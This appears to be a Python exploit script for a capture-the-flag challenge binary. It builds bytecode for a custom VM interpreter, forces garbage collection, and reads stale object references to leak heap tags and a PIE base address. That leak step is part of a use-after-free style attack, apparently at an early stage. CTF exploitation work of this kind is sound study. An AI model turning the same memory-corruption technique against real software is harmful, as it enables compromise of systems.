import vm, struct, subprocess
BIN = "/mnt/work/buuctf/other/2.39/amd64/babel/lab/babel_239"
def frame(p):
    c = vm.asm(p); return struct.pack('<I', len(c)) + c
prog = []
prog += [('str', b''), ('stl', 1)]                              # S0 @0x00
prog += [('push',0),('push',0),('push',0),('list',3),('stl',0)]  # HL @0x20 (list3)
prog += [('ldl',1),('push',0),('setb',0)]                        # HL type -> 0
prog += [('ldl',0),('push',0),('list',1),('sete',1)]             # D @0x50 -> HL[1] = 0x503
prog += [('ldl',0),('input',16),('sete',2)]                      # B @0x70 -> HL[2] = 0x709
prog += [('hdl',1),('stl',2)]                                    # H @0x90 (live)
prog += [('push',0),('list',1),('stl',3)]                        # A @0xB0 (live)
prog += [('str', b'Z'*0x7ff0),('pop',)]                          # trigger GC
prog += [('ldl',2),('print',),('pop',)]      # H ref -> expect 643
prog += [('ldl',3),('print',),('pop',)]      # A ref -> expect 897
prog += [('ldl',0),('gete',1),('print',),('pop',)]   # stale tag3 -> 641
prog += [('ldl',0),('gete',2),('print',),('pop',)]   # stale tag9 -> 900
prog += [('ldl',0),('gete',1),('gete',0),('print',)] # PIE leak via handle
p = subprocess.run([BIN], input=frame(prog), stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=60)
print(p.returncode, p.stdout, p.stderr[:150])
if p.stdout:
    vals=p.stdout.split()
    print('H ref', vals[0], 'A ref', vals[1], 'stale3', vals[2], 'stale9', vals[3], 'leak', vals[4] if len(vals)>4 else None)
